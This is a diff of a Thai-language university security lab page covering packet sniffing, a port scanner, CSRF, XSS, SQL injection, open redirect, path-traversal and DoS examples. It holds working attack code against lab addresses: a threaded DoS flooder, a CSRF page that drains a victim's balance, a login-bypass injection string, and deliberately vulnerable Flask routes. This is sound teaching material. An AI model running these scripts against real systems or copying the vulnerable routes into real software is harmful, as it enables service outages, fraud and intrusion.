@@ -1,5 +1,5 @@
 ---
-title: Lab3 - Sniffing
+title: Lab3 - Network Programming & Web Security
 lastUpdated: 2024-12-21
 draft: false
 ---
@@ -12,7 +12,6 @@ import {
   LinkButton,
   FileTree
 } from "@astrojs/starlight/components";
-import im1 from '../../../assets/images/lab3/new_vm.png';
 
 <LinkButton href={"/int4101/print/lab3"} icon="seti:pdf" target={"_blank"}>
   Print
@@ -37,50 +36,50 @@ Get-FileHash C:\Users\xxxx\Downloads\ubuntu-24.04.1-desktop-amd64.iso -Algorithm
 ## Install Ubuntu
 <Steps>
 
-  3. ติดตั้ง Ubuntu 24.04.1 LTS บท VirtualBox <Image src={im1} alt="New VM" loading="eager" /> 
-  4. ตรง Name ใส่ Ubuntu 24.04.1 ![New VM Ubuntu](../../../assets/images/lab3/new_vm_ubuntu.png) 
+  3. ติดตั้ง Ubuntu 24.04.1 LTS บท VirtualBox ![New VM](/int4101/images/lab3/new_vm.png) 
+  4. ตรง Name ใส่ Ubuntu 24.04.1 ![New VM Ubuntu](/int4101/images/lab3/new_vm_ubuntu.png) 
   5. ตรง Folder ก็ตามค่าเริ่มต้นไป 
-  6. ตรง ISO Image กดปุ่ม Other ![SelectISO](../../../assets/images/lab3/select_iso.png) 
-  7. หาไฟล์ ISO ที่ Download มา ![Open ISO](../../../assets/images/lab3/open_iso.png) 
+  6. ตรง ISO Image กดปุ่ม Other ![SelectISO](/int4101/images/lab3/select_iso.png) 
+  7. หาไฟล์ ISO ที่ Download มา ![Open ISO](/int4101/images/lab3/open_iso.png) 
   8. แล้วกด Open 
-  9. ติ๊กถูก Skip Unattended Installation ![Skip Unattended](../../../assets/images/lab3/setup_ubuntu_skip_unattended.png)
-  10. ตรง Hardware เปลี่ยน Base memory เป็น 4096 mb ![Ram 4096mb](../../../assets/images/lab3/memory_4gb.png)
+  9. ติ๊กถูก Skip Unattended Installation ![Skip Unattended](/int4101/images/lab3/setup_ubuntu_skip_unattended.png)
+  10. ตรง Hardware เปลี่ยน Base memory เป็น 4096 mb ![Ram 4096mb](/int4101/images/lab3/memory_4gb.png)
       :::danger[ระวัง]
       minimum requirements ของ Ubuntu 24.04.1 คือ 4GB ถ้าตั้งน้อยกว่านั้นตอนติดตั้งจะค้างได้
       :::
   11. กดปุ่ม Finish แล้ว Virtual Box จะรันหน้าต่างขึ้นมา
-  12. กด Enter เลือก \*Try or Install Ubuntu ![BootVM](../../../assets/images/lab3/boot_vm.png) 
-  13. จะโหลด Ubuntu ขึ้นมาดังรูป ![Setup Ubuntu](../../../assets/images/lab3/setup_ubuntu.png) 
-  14. ระบบจะติดตั้ง Ubuntu กด Next ![Setup Ubuntu2](../../../assets/images/lab3/setup_ubuntu2.png) 
-  15. กด Next ![Setup Ubuntu3](../../../assets/images/lab3/setup_ubuntu3.png) 
-  16. กด Next ![Setup Ubuntu4](../../../assets/images/lab3/setup_ubuntu4.png) 
-  17. กด Next ![Setup Ubuntu5](../../../assets/images/lab3/setup_ubuntu5.png) 
-  18. กด Next ![Setup Ubuntu6](../../../assets/images/lab3/setup_ubuntu6.png) 
-  19. กด Next ![Setup Ubuntu7](../../../assets/images/lab3/setup_ubuntu7.png) 
-  20. กด Next ![Setup Ubuntu8](../../../assets/images/lab3/setup_ubuntu8.png) 
-  21. กด Next ![Setup Ubuntu9](../../../assets/images/lab3/setup_ubuntu9.png) 
-  22. ตรง Your name ใสชื่อตัวเรา และตรง Password ให้ตั้งค่าตามที่เราต้องการ แล้วกด Next ![Setup Ubuntu10](../../../assets/images/lab3/setup_ubuntu10.png) 
-  23. กด Next ![Setup Ubuntu11](../../../assets/images/lab3/setup_ubuntu11.png) 
-  24. กด Install ![Setup Ubuntu12](../../../assets/images/lab3/setup_ubuntu12.png) 
-  25. ระบบจะติดตั้ง Ubuntu ![Setup Ubuntu13](../../../assets/images/lab3/setup_ubuntu13.png) 
+  12. กด Enter เลือก \*Try or Install Ubuntu ![BootVM](/int4101/images/lab3/boot_vm.png) 
+  13. จะโหลด Ubuntu ขึ้นมาดังรูป ![Setup Ubuntu](/int4101/images/lab3/setup_ubuntu.png) 
+  14. ระบบจะติดตั้ง Ubuntu กด Next ![Setup Ubuntu2](/int4101/images/lab3/setup_ubuntu2.png) 
+  15. กด Next ![Setup Ubuntu3](/int4101/images/lab3/setup_ubuntu3.png) 
+  16. กด Next ![Setup Ubuntu4](/int4101/images/lab3/setup_ubuntu4.png) 
+  17. กด Next ![Setup Ubuntu5](/int4101/images/lab3/setup_ubuntu5.png) 
+  18. กด Next ![Setup Ubuntu6](/int4101/images/lab3/setup_ubuntu6.png) 
+  19. กด Next ![Setup Ubuntu7](/int4101/images/lab3/setup_ubuntu7.png) 
+  20. กด Next ![Setup Ubuntu8](/int4101/images/lab3/setup_ubuntu8.png) 
+  21. กด Next ![Setup Ubuntu9](/int4101/images/lab3/setup_ubuntu9.png) 
+  22. ตรง Your name ใสชื่อตัวเรา และตรง Password ให้ตั้งค่าตามที่เราต้องการ แล้วกด Next ![Setup Ubuntu10](/int4101/images/lab3/setup_ubuntu10.png) 
+  23. กด Next ![Setup Ubuntu11](/int4101/images/lab3/setup_ubuntu11.png) 
+  24. กด Install ![Setup Ubuntu12](/int4101/images/lab3/setup_ubuntu12.png) 
+  25. ระบบจะติดตั้ง Ubuntu ![Setup Ubuntu13](/int4101/images/lab3/setup_ubuntu13.png) 
   26. ระบบจะให้เรา Reboot
-  27. Login เข้ามาจะเจอหน้า Welcome ให้กด Next ไปเรื่อยๆ ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu.png)
-  28. ให้กด Next ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu2.png)
-  29. ให้กด Next ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu3.png)
-  30. ให้กด Finish ![Welcome Ubuntu](../../../assets/images/lab3/welcome_ubuntu4.png)
-  31. กด Shutdown VM ออกมาก่อนแล้วไปที่ Settings ![Settings VM](../../../assets/images/lab3/vm_settings.png)
-  32. อย่าลืมเปลี่ยน Network ให้เป็น Bridge Mode ![Bridge Mode](../../../assets/images/lab3/network_bridge_mode.png)
+  27. Login เข้ามาจะเจอหน้า Welcome ให้กด Next ไปเรื่อยๆ ![Welcome Ubuntu](/int4101/images/lab3/welcome_ubuntu.png)
+  28. ให้กด Next ![Welcome Ubuntu](/int4101/images/lab3/welcome_ubuntu2.png)
+  29. ให้กด Next ![Welcome Ubuntu](/int4101/images/lab3/welcome_ubuntu3.png)
+  30. ให้กด Finish ![Welcome Ubuntu](/int4101/images/lab3/welcome_ubuntu4.png)
+  31. กด Shutdown VM ออกมาก่อนแล้วไปที่ Settings ![Settings VM](/int4101/images/lab3/vm_settings.png)
+  32. อย่าลืมเปลี่ยน Network ให้เป็น Bridge Mode ![Bridge Mode](/int4101/images/lab3/network_bridge_mode.png)
 </Steps>
 
 ## Install VSCode
 
 <Steps>
 1. ไปที่ [VSCode Website](https://code.visualstudio.com)
-2. กด Download VSCode เลือก .deb ![VSCode DEB](../../../assets/images/lab3/vscode_website.png)
-3. รอโหลด VSCode ![Download VSCode](../../../assets/images/lab3/download_vscode.png)
-4. Open File และ Install ![Install VSCode](../../../assets/images/lab3/install_vscode.png)
-5. Open VSCode ![Open VSCode](../../../assets/images/lab3/open_vscode.png)
-6. Install VSCode Extension ![VSCode Python Extension](../../../assets/images/lab3/vscode_python_extension.png)
+2. กด Download VSCode เลือก .deb ![VSCode DEB](/int4101/images/lab3/vscode_website.png)
+3. รอโหลด VSCode ![Download VSCode](/int4101/images/lab3/download_vscode.png)
+4. Open File และ Install ![Install VSCode](/int4101/images/lab3/install_vscode.png)
+5. Open VSCode ![Open VSCode](/int4101/images/lab3/open_vscode.png)
+6. Install VSCode Extension ![VSCode Python Extension](/int4101/images/lab3/vscode_python_extension.png)
 </Steps>
 
 ## Install Curl
@@ -90,7 +89,7 @@ Get-FileHash C:\Users\xxxx\Downloads\ubuntu-24.04.1-desktop-amd64.iso -Algorithm
 sudo apt install curl
 ```
 หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
-![Install Python3](../../../assets/images/lab3/install_curl.png)
+![Install Python3](/int4101/images/lab3/install_curl.png)
 </Card>
 ## Install Python
 จะทำการติดตั้งเครื่องมือต่างๆ ดังนี้
@@ -105,7 +104,7 @@ sudo apt install curl
 sudo apt install python3
 ```
 หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
-![Install Python3](../../../assets/images/lab3/install_python3.png)
+![Install Python3](/int4101/images/lab3/install_python3.png)
 </Card>
 ### Install python3-scapy
 <Card title='Install Scapy'>
@@ -116,7 +115,7 @@ sudo apt install python3-scapy
 
 หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
 
-![Python VENV](../../../assets/images/lab3/install_scapy.png)
+![Python VENV](/int4101/images/lab3/install_scapy.png)
 
 หลังจากนั้นพิมพ์ <kbd>scapy</kbd> + <kbd>Enter</kbd> เพื่อดูว่าได้ติดตั้งแล้ว
 
@@ -124,7 +123,7 @@ sudo apt install python3-scapy
 scapy
 ```
 
-![Python Scapy](../../../assets/images/lab3/check_scapy_install.png)
+![Python Scapy](/int4101/images/lab3/check_scapy_install.png)
 
 </Card>
 ### Install python3-venv
@@ -136,7 +135,7 @@ sudo apt install python3-venv
 
 หลังจากนั้นกด <kbd> y </kbd> + <kbd>Enter</kbd>
 
-![Python VENV](../../../assets/images/lab3/install_python_venv.png)
+![Python VENV](/int4101/images/lab3/install_python_venv.png)
 
 </Card>
 
@@ -614,12 +613,12 @@ sudo apt install python3-venv
     <input type="number" name="account" value="2">
     </form>
     <iframe hidden name="csrf-frame"></iframe>
-    
+
     <h3>You won $100,000</h3>
     <button onClick="hack();" id="button">Click to claim</button>
     <br>
     <div id="warning"></div>
-    
+
     <script>
         function hack() {
             document.getElementById("hack").submit();
@@ -676,14 +675,14 @@ sudo apt install python3-venv
 <Card title='Sniffing'>
 Sniffing is a process of monitoring and capturing all data packets passing through given network.
 
-![Packet Sniffer](../../../assets/images/lab3/packet_sniffer.svg)
+![Packet Sniffer](/int4101/images/lab3/packet_sniffer.svg)
 </Card>
 
 
 :::note
 โครงสร้างของ IP Header จะแบ่งได้ตามรูป
 
-![IP Header](../../../assets/images/lab3/ip_header.svg)
+![IP Header](/int4101/images/lab3/ip_header.svg)
 
 :::
 
@@ -834,7 +833,7 @@ chmod +x script.py
 ip addr
 ```
 
-![ip addr command](../../../assets/images/lab3/ip_addr.png)
+![ip addr command](/int4101/images/lab3/ip_addr.png)
 
 หลังจากนั้นทำการ ping จาก PowerShell ใน Windows
 
@@ -842,7 +841,7 @@ ip addr
 ping 192.168.96.155
 ```
 
-![Ping](../../../assets/images/lab3/ping_icmp.png)
+![Ping](/int4101/images/lab3/ping_icmp.png)
 
 แล้วทำการรันโปรแกรมเพื่อดัก Protocol ICMP ที่เกิดจากการใช้คำสั่ง ping
 
@@ -852,7 +851,7 @@ sudo ./sniff_icmp.py --ip 192.168.96.155
 
 **OUTPUT**
 
-![Sniff ICMP](../../../assets/images/lab3/output_sniff_icmp.png)
+![Sniff ICMP](/int4101/images/lab3/output_sniff_icmp.png)
 
 </Card>
 
@@ -967,7 +966,7 @@ if __name__ == '__main__':
 sudo python3 -m http.server 80
 ```
 
-![Simple Server](../../../assets/images/lab3/python_simple_server.png)
+![Simple Server](/int4101/images/lab3/python_simple_server.png)
 
 ใช้ CURL ส่งคำสั่ง POST ไปยัง Server โดยใช้ username คือ krit และ password คือ 1234 ไปยัง IP ของ Ubuntu
 
@@ -977,7 +976,7 @@ curl -L --interface enp0s3 -d 'username=krit&password=1234!' 192.168.96.155
 
 **OUTPUT**
 
-![Sniff Username กับ Password](../../../assets/images/lab3/sniff_username_password.png)
+![Sniff Username กับ Password](/int4101/images/lab3/sniff_username_password.png)
 
 
 :::caution[คำถาม]
@@ -991,7 +990,7 @@ curl -L --interface enp0s3 -d 'username=krit&password=1234!' 192.168.96.155
 
 อันนี้จะใช้ tools ที่ชื่อว่า Scapy ทำการ Sniff Packet ออกมา
 จากรูปด้านล่างจะใช้ Scapy ทำการ Sniff protocol icmp ออกมา
-![Scapy Sniff ICMP](../../../assets/images/lab3/sniff_target_ip.png)
+![Scapy Sniff ICMP](/int4101/images/lab3/sniff_target_ip.png)
 ซึ่งเราสามารถใช้ Scapy จาก Python ได้ด้วย
 
 <Card title='Example 2'>
@@ -1075,7 +1074,7 @@ sudo ./sniff_scapy.py --iface enp0s3 --filter 'tcp port 80' --keywords /home/kri
 sudo python3 -m http.server 80
 ```
 
-![Simple Server](../../../assets/images/lab3/python_simple_server.png)
+![Simple Server](/int4101/images/lab3/python_simple_server.png)
 
 ใช้ CURL ส่งคำสั่ง POST ไปยัง Server โดยใช้ username คือ krit และ password คือ 1234 ไปยัง IP ของ Ubuntu
 
@@ -1094,7 +1093,7 @@ curl.exe
 
 **OUTPUT**
 
-![Sniff Simple Server](../../../assets/images/lab3/sniff_simple_server.png)
+![Sniff Simple Server](/int4101/images/lab3/sniff_simple_server.png)
 
 </Card>
 
@@ -1112,7 +1111,7 @@ sudo ./sniff_scapy.py --iface enp0s3 --filter 'tcp port 5000' --keywords /home/k
 
 **OUTPUT**
 
-![Sniff Flask](../../../assets/images/lab3/sniff_flask.png)
+![Sniff Flask](/int4101/images/lab3/sniff_flask.png)
 
 </Card>
 
@@ -1158,7 +1157,7 @@ source .venv/bin/activate
     ```
 </Steps>
 
-```python
+```python wrap
 // sniff_dns.py
 #!/usr/bin/env python3
 
@@ -1237,15 +1236,80 @@ if __name__ == '__main__':
 
 ในกรณีการรันโปรแกรมนี้จะต้องอยู่ในโหมดของ sudo
 
-```python
+```python wrap
 sudo -E env PATH="$PATH" python3 sniff_dns_full.py --network 192.168.96.0/24 --routerip 192.168.96.246 --iface enp0s3
 ```
 :::
 
 **OUTPUT**
 
-![DNS Sniffer](../../../assets/images/lab3/dns_sniffer.png)
+![DNS Sniffer](/int4101/images/lab3/dns_sniffer.png)
 
+
+</Card>
+
+## Port Scanner
+
+<Card title='Example 1'>
+
+ตัวอย่างการ Scan port ที่เปิดอยู่ โดย scan port ระหว่าง 1-1023
+
+```python
+import socket
+import threading
+from queue import Queue
+
+target = '192.168.96.88'
+queue = Queue()
+open_ports = []
+
+def port_scan(port):
+    try:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((target, port))
+        return True
+    except socket.error as e:
+        # print(e)
+        return False
+
+def fill_queue(port_list):
+    for port in port_list:
+        queue.put(port)
+
+def worker():
+    while not queue.empty():
+        port = queue.get()
+        if port_scan(port):
+            print('Port {} is open'.format(port))
+            open_ports.append(port)
+            
+port_list = range(1,1024)
+fill_queue(port_list)
+
+thread_list = []
+
+for t in range(100):
+    thread = threading.Thread(target=worker)
+    thread_list.append(thread)
+    
+for thread in thread_list:
+    thread.start()
+
+for thread in thread_list:
+    thread.join()
+
+print('Open ports are: ',open_ports)
+
+```
+
+**OUTPUT**
+
+```bash
+Port 135 is open
+Port 139 is open
+Port 445 is open
+Open ports are:  [135, 139, 445]
+```
 
 </Card>
 
@@ -1276,7 +1340,7 @@ pip install flask-login
 อย่าลืมเปลี่ยน IP เป็น IP ของ Ubuntu ที่รัน Webserver อยู่
 :::
 
-```html del="192.168.96.155"
+```html del="192.168.96.155" wrap
 <form hidden id="hack" target="csrf-frame" action="http://192.168.96.155:5000/accounts" method="POST" autocomplete="off">
     <input type="number" name="amount" value="2000">
     <input type="number" name="account" value="2">
@@ -1303,20 +1367,20 @@ pip install flask-login
     flask --app main run --host 0.0.0.0 --debug
     ```
 2. Login `username` คือ `test` และ `password` คือ `test`
-![Login Page](../../../assets/images/lab3/login.png)
+![Login Page](/int4101/images/lab3/login.png)
 
 3. เปิดหน้า Website ตัวอย่างขึ้นมาแสดงให้เห็นว่าเรามีเงินอยู่ $2000
-![Simple Website](../../../assets/images/lab3/csrf.png)
+![Simple Website](/int4101/images/lab3/csrf.png)
 
 4. รัน Hackers Click Bait
     ```bash
     python3 -m http.server -b 0.0.0.0 5002
     ```
 5. Hacker ทำหน้าหลอกขึ้นมาให้เรากดปุ่ม พอกดปุ่มก็ขึ้นบอกว่าให้เราเช็ค balance
-![Hacker Website](../../../assets/images/lab3/hacker_csrf_bait.png)
+![Hacker Website](/int4101/images/lab3/hacker_csrf_bait.png)
 
 6. ถ้า Refresh หน้า Website จะเห็นได้ว่า เงินจะเหลือ $0
-![CSRF Hacked](../../../assets/images/lab3/csrf_hacked.png)
+![CSRF Hacked](/int4101/images/lab3/csrf_hacked.png)
 </Steps>
 </Card>
 
@@ -1347,16 +1411,16 @@ pip install flask-login
 ```html
 tooltip onmouseover=alert(1)
 ```
-![Input XSS](../../../assets/images/lab3/input_xss.png)
+![Input XSS](/int4101/images/lab3/input_xss.png)
 เมื่อเอาเม้าส์ไปวาง
-![Result XSS](../../../assets/images/lab3/result_xss.png)
+![Result XSS](/int4101/images/lab3/result_xss.png)
 2. หรือ ใส่ tag ลงไป
 ```html
 <script>alert('javascript was executed')</script>
 ```
-![Input2 XSS](../../../assets/images/lab3/input2_xss.png)
+![Input2 XSS](/int4101/images/lab3/input2_xss.png)
 ก็จะทำงานตอนโหลดหน้าใหม่ด้วยการ show alert
-![Result2 XSS](../../../assets/images/lab3/result2_xss.png)
+![Result2 XSS](/int4101/images/lab3/result2_xss.png)
 </Card>
 
 ### SQL Injection Attack
@@ -1375,11 +1439,11 @@ tooltip onmouseover=alert(1)
 SELECT * FROM users WHERE username = '' OR 'a'='a';-- AND password = '';
 ```
 
-![SQL Injection](../../../assets/images/lab3/sql_injection.png)
+![SQL Injection](/int4101/images/lab3/sql_injection.png)
 
 เมื่อคลิก Sign in ไป ก็จะสามารถ bypass login ได้ดังรูปด้านล่าง
 
-![Result SQL Injection](../../../assets/images/lab3/result_sql_injection.png)
+![Result SQL Injection](/int4101/images/lab3/result_sql_injection.png)
 
 :::danger
 สาเหตุเพราะการใช้ concatenation string กับ SQL
@@ -1396,6 +1460,82 @@ def authen(username, password):
 
 </Card>
 
+### Redirect Attack
+
+<Card title='Example 1'>
+ในกรณีที่ Website มีการส่งค่าผ่านทาง Request Parameter และในบางกรณีต้อง Redirect ไปอีก URL นึง ถ้าไม่มีการกรอง Request Parameter ที่ส่งเข้ามาก็อาจจะโดนโจมตีได้ โดย Hacker อาจจะทำการหลอก User ให้ไปกรอกข้อมูลจากเวบไซต์ของ Hacker เอง
+
+```python ins={1-5}
+@app.route("/verify")
+def verify_email():
+    email = request.args.get('email')
+    return redirect(email)
+```
+
+ซึ่งในกรณีนี้ถ้าไม่ได้มีการกรองอะไรเลยแล้ว Redirect ทันที `http://192.168.96.155:5000/verify?email=http://www.google.com` ไปยัง `www.google.com` 
+
+</Card>
+
+### SSRF Attack
+
+<Card title='Example 1'>
+ถ้าเขียนโปรแกรมไม่ระวัง อย่างเช่น ต้องการให้คน Download file ออกมาได้โดยตรง เช่น `http://192.168.96.155:5000/download/main.py`
+
+```python ins={1-4}
+@app.route("/download/<path:filename>")
+def download_file(filename):
+    f = open(filename, "r")
+    return Response(f.read(), mimetype='text/plain')
+```
+
+**OUTPUT**
+
+ผลลัพธ์ที่ได้ก็จะกลายเป็นแบบนี้
+
+![SSRF Attack](../../../../public/images/lab3/ssrf_attack.png)
+
+</Card>
+
+### DOS Attack
+
+<Card title='Example 1'>
+
+:::danger
+โปรแกรมนี้เพื่อการศึกษาเท่านั้น ไม่เหมาะไปทำกับเครือข่ายอื่นๆ
+:::
+
+ใช้ Thread ยิงไปที่ IP 192.168.96.155:5000 นั่นก็คือ WebServer ที่เราทำเอาไว้
+
+```python wrap
+import threading
+import socket
+
+target = '192.168.96.155'
+port = 5000
+fake_ip = '182.21.20.32'
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(('GET / HTTP/1.1\r\nHost: '+target+':'+str(port)).encode('ascii'),(target, port))
+        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+```
+
+**OUTPUT**
+
+ผลกระทบจากการโดน DOS ก็คือ CPU ขึ้น 100% เครื่อง Server จะทำงานอื่นไม่ได้เลยนี่คือข้อเสีย
+
+![DOS CPU 100%](/int4101/images/lab3/dos_cpu100.png)
+
+</Card>
+
 ### Install SSL Certificate
 
 <Card title='Example 1'>
@@ -1403,13 +1543,13 @@ def authen(username, password):
 ในกรณีที่ใช้ http ธรรมดา จะไม่มีการเข้ารหัสข้อมูลที่รับส่งกัน ทำให้เกิดการ Sniff ได้ ดังนั้นวิธีแก้อย่างแรกคือการใช้งาน https
 โดยสร้าง Certificate ขึ้นมาด้วย OpenSSL 
 
-```bash
+```bash wrap
 openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
 ```
 
 โปรแกรมจะถาม ให้เราป้อนตามรูปข้างล่าง
 
-![Create Certificate](../../../assets/images/lab3/create_ssl_cert.png)
+![Create Certificate](/int4101/images/lab3/create_ssl_cert.png)
 
 :::danger
 การสร้าง Certificate รูปแบบนี้เค้าเรียกว่า Self Signed Certificate ซึ่งจะให้สำหรับพัฒนาภายในเครื่องเท่านั้น ไม่สามารถใช้งานจริงได้ เพราะยังไม่ถือว่าปลอดภัย
@@ -1424,14 +1564,14 @@ app.run(host='0.0.0.0',debug=True, ssl_context=('cert.pem', 'key.pem'),port=5000
 
 หลังจากนั้นเวลาเราเปิด Browser ขึ้นมา Browser จะยังคงแจ้งเตือนว่า Website นี้ไม่ปลอดภัย เนื่องจาก certificate ที่ใช้ถูกสร้างขึ้นมาเพื่อใช้ในการพัฒนา
 
-![Invalid Cert](../../../assets/images/lab3/invalid_cert.png)
+![Invalid Cert](/int4101/images/lab3/invalid_cert.png)
 
 จะต้องทำการกด `Advanced` และกด `Continue to` ตามรูปด้านล่าง
 
-![Accept invalid cert](../../../assets/images/lab3/accept_invalid_cert.png)
+![Accept invalid cert](/int4101/images/lab3/accept_invalid_cert.png)
 
 ก็จะเข้าหน้า Website ได้แต่จะแจ้งเตือนว่า Website ไม่ปลอดภัย
 
-![Warning invalid cert](../../../assets/images/lab3/warning_invalid_cert.png)
+![Warning invalid cert](/int4101/images/lab3/warning_invalid_cert.png)
 </Card>
 
